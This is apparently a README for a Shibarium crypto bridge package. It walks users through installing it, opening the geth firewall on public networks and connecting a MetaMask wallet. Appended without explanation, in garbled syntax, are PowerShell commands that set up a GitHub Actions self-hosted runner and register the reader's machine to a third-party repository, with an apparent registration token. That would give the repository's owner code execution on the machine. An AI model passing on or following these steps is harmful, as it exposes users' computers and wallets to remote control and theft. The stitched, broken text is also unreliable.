# Shibarium-Bridge
# https://shibatoken.com
The Shibarium bridge enables interoperability between multiple blockchain networks.
The features include token transfers from ethereum main chain to the Shibarium ecosystem.


# Dependecies

This version of shibarium-bridge container has been tested with windows 10 

You must first have [Node.js and npm](https://nodejs.org/en/download/ "Node.js and npm") installed.
Visit the download page and use the windows installer.


Install using npm package registry

``` npm i shibarium-bridge ``` :gem: 

Clone Using Github:

`https://github.com/Shiba-Community-Dev/shibarium-bridge.git`

Download Zip File:

`https://github.com/Shiba-Community-Dev/shibarium-bridge/archive/refs/heads/main.zip` :loudspeaker:

Unzip to folder and open command shell inside that folder
Once inside "shibarium-bridge/" root folder Type command in shell.

 ` node app.js or npm start`


1.) This will open a setup page if the network has not been initalized yet.

![setup](https://github.com/Shiba-Community-Dev/shibarium-bridge/blob/main/test/shibarium_setup.jpg "setup")

2.) After the installation completes, you will be presented with a button to proceed to bridge interface.


3.) After connecting to Bridge interface . You will be able to start the local Shibaruium Node. :black_flag: :black_flag: :black_flag:
    
    *IMPORTANT* You must allow geth access through windows firewall. It will normally pop up a dialog box requesting permissions. 
    When asked just allow geth on private and public networks. */IMPORATANT*  

![bridge](https://github.com/Shiba-Community-Dev/shibarium-bridge/blob/main/test/shibarium_bridge_interface.jpg "bridge")

4.) Connecting MetaMask is simple by connecting wallet and adding the shibarium network.

![metamask](https://github.com/Shiba-Community-Dev/shibarium-bridge/blob/main/test/shibarium_metamask.jpg "metamask")
Create a folder under the drive root
$ mkdir actions-runner; cd actions-runner# Download the latest runner package
$ Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/v2.299.1/actions-runner-win-x64-2.299.1.zip -OutFile actions-runner-win-x64-2.299.1.zip# Optional: Validate the hash
$ if((Get-FileHash -Path actions-runner-win-x64-2.299.1.zip -Algorithm SHA256).Hash.ToUpper() -ne 'f7940b16451d6352c38066005f3ee6688b53971fcc20e4726c7907b32bfdf539'.ToUpper()){ throw 'Computed checksum did not match' }# Extract the installer
$ Add-Type -AssemblyName System.IO.Compression.FileSystem ; [System.IO.Compression.ZipFile]::ExtractToDirectory("$shibastax/actions-runner-win-x64-2.299.1.zip", "$shibastax")
Configure
# Create the runner and start the configuration experience
$ .shibastax./config.cmd --url https://github.com/geniusj204/shibarium-bridge-token.AUPA6PGSGTBWHEYO4GFDX6TDV25KK
# Run it!
$ shibastax./run.cmd
Using your self-hosted runner
# Use this YAML in your workflow file for each job
# runs-on:eth-mainnet shibarium-testnet
# Shiba Inu Ecosystem (c) 2023
# Joseph G Parente
# josephparente204@gmail.com
![6e2b6532d229c86100fbd5b8b2ca82c7_0](https://user-images.githubusercontent.com/85856060/224560160-6ce7842e-4634-4184-9c62-31673536c1dd.jpeg)
